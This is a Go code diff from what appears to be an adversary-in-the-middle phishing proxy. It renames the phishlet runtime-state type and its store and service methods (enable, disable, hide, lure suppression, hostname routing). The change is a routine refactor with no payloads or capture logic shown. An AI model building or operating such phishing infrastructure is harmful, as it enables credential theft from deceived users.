@@ -9,10 +9,10 @@ import (
 
 // PhishletStore is the persistence interface required by PhishletService.
 type PhishletStore interface {
-	GetPhishletConfig(name string) (*PhishletConfig, error)
-	SetPhishletConfig(cfg *PhishletConfig) error
-	ListPhishletConfigs() ([]*PhishletConfig, error)
-	DeletePhishletConfig(name string) error
+	GetPhishletDeployment(name string) (*PhishletDeployment, error)
+	SetPhishletDeployment(deployment *PhishletDeployment) error
+	ListPhishletDeployments() ([]*PhishletDeployment, error)
+	DeletePhishletDeployment(name string) error
 
 	CreateSubPhishlet(sp *SubPhishlet) error
 	GetSubPhishlet(name string) (*SubPhishlet, error)
@@ -64,9 +64,11 @@ func (p *PhishletDef) MatchesAuthURL(rawURL string) bool {
 	return false
 }
 
-// PhishletConfig is the runtime state of a phishlet stored in the database.
-// Separate from PhishletDef (the static YAML definition).
-type PhishletConfig struct {
+// PhishletDeployment is the operator's runtime state for a phishlet stored in
+// the database: the hostname it answers on, whether it is enabled/hidden, and
+// which DNS provider manages its records. Separate from PhishletDef (the static
+// YAML definition).
+type PhishletDeployment struct {
 	Name        string
 	BaseDomain  string
 	DNSProvider string
@@ -209,13 +211,13 @@ func NewPhishletService(store PhishletStore, bus EventBus, dns *DNSService) *Phi
 // LoadActiveFromDB populates the in-memory hostname set from the database.
 // Call once during startup, before the proxy begins accepting connections.
 func (s *PhishletService) LoadActiveFromDB() error {
-	configs, err := s.store.ListPhishletConfigs()
+	deployments, err := s.store.ListPhishletDeployments()
 	if err != nil {
 		return fmt.Errorf("loading active phishlets: %w", err)
 	}
-	for _, cfg := range configs {
-		if cfg.Enabled && cfg.Hostname != "" {
-			s.activeHostnames.Store(strings.ToLower(cfg.Hostname), struct{}{})
+	for _, deployment := range deployments {
+		if deployment.Enabled && deployment.Hostname != "" {
+			s.activeHostnames.Store(strings.ToLower(deployment.Hostname), struct{}{})
 		}
 	}
 	return nil
@@ -231,82 +233,82 @@ func (s *PhishletService) Contains(hostname string) bool {
 // Enable marks a phishlet as active, optionally updating its hostname, base
 // domain, and DNS provider. The in-memory hostname set is updated atomically
 // so routing takes effect immediately without a restart.
-func (s *PhishletService) Enable(name, hostname, baseDomain, dnsProvider string) (*PhishletConfig, error) {
-	cfg, err := s.store.GetPhishletConfig(name)
+func (s *PhishletService) Enable(name, hostname, baseDomain, dnsProvider string) (*PhishletDeployment, error) {
+	deployment, err := s.store.GetPhishletDeployment(name)
 	if err != nil {
-		cfg = &PhishletConfig{Name: name}
+		deployment = &PhishletDeployment{Name: name}
 	}
 	if hostname != "" {
-		cfg.Hostname = hostname
+		deployment.Hostname = hostname
 	}
 	if baseDomain != "" {
-		cfg.BaseDomain = baseDomain
+		deployment.BaseDomain = baseDomain
 	}
 	if dnsProvider != "" {
-		cfg.DNSProvider = dnsProvider
+		deployment.DNSProvider = dnsProvider
 	}
-	if cfg.Hostname == "" {
+	if deployment.Hostname == "" {
 		return nil, fmt.Errorf("hostname: required")
 	}
-	cfg.Enabled = true
-	if err := s.store.SetPhishletConfig(cfg); err != nil {
+	deployment.Enabled = true
+	if err := s.store.SetPhishletDeployment(deployment); err != nil {
 		return nil, err
 	}
-	s.activeHostnames.Store(strings.ToLower(cfg.Hostname), struct{}{})
-	return cfg, nil
+	s.activeHostnames.Store(strings.ToLower(deployment.Hostname), struct{}{})
+	return deployment, nil
 }
 
 // Disable marks a phishlet as inactive and removes it from the hostname set.
-func (s *PhishletService) Disable(name string) (*PhishletConfig, error) {
-	cfg, err := s.store.GetPhishletConfig(name)
+func (s *PhishletService) Disable(name string) (*PhishletDeployment, error) {
+	deployment, err := s.store.GetPhishletDeployment(name)
 	if err != nil {
 		return nil, err
 	}
-	cfg.Enabled = false
-	if err := s.store.SetPhishletConfig(cfg); err != nil {
+	deployment.Enabled = false
+	if err := s.store.SetPhishletDeployment(deployment); err != nil {
 		return nil, err
 	}
-	if cfg.Hostname != "" {
-		s.activeHostnames.Delete(strings.ToLower(cfg.Hostname))
+	if deployment.Hostname != "" {
+		s.activeHostnames.Delete(strings.ToLower(deployment.Hostname))
 	}
-	return cfg, nil
+	return deployment, nil
 }
 
 // Hide marks a phishlet as hidden (suppressed from lure URL generation).
 // Does not affect routing — the phishlet keeps intercepting traffic.
-func (s *PhishletService) Hide(name string) (*PhishletConfig, error) {
-	cfg, err := s.store.GetPhishletConfig(name)
+func (s *PhishletService) Hide(name string) (*PhishletDeployment, error) {
+	deployment, err := s.store.GetPhishletDeployment(name)
 	if err != nil {
 		return nil, err
 	}
-	cfg.Hidden = true
-	if err := s.store.SetPhishletConfig(cfg); err != nil {
+	deployment.Hidden = true
+	if err := s.store.SetPhishletDeployment(deployment); err != nil {
 		return nil, err
 	}
-	return cfg, nil
+	return deployment, nil
 }
 
 // Unhide reverses Hide.
-func (s *PhishletService) Unhide(name string) (*PhishletConfig, error) {
-	cfg, err := s.store.GetPhishletConfig(name)
+func (s *PhishletService) Unhide(name string) (*PhishletDeployment, error) {
+	deployment, err := s.store.GetPhishletDeployment(name)
 	if err != nil {
 		return nil, err
 	}
-	cfg.Hidden = false
-	if err := s.store.SetPhishletConfig(cfg); err != nil {
+	deployment.Hidden = false
+	if err := s.store.SetPhishletDeployment(deployment); err != nil {
 		return nil, err
 	}
-	return cfg, nil
+	return deployment, nil
 }
 
-// GetConfig returns the stored config for a phishlet by name.
-func (s *PhishletService) GetConfig(name string) (*PhishletConfig, error) {
-	return s.store.GetPhishletConfig(name)
+// GetDeployment returns the stored deployment for a phishlet by name.
+func (s *PhishletService) GetDeployment(name string) (*PhishletDeployment, error) {
+	return s.store.GetPhishletDeployment(name)
 }
 
-// ListConfigs returns all stored phishlet configs.
-func (s *PhishletService) ListConfigs() ([]*PhishletConfig, error) {
-	return s.store.ListPhishletConfigs()
+// ListDeployments returns all stored phishlet deployments.
+func (s *PhishletService) ListDeployments() ([]*PhishletDeployment, error) {
+	return s.store.ListPhishletDeployments()
 }
 
 // CreateSubPhishlet persists a sub-phishlet instantiation.
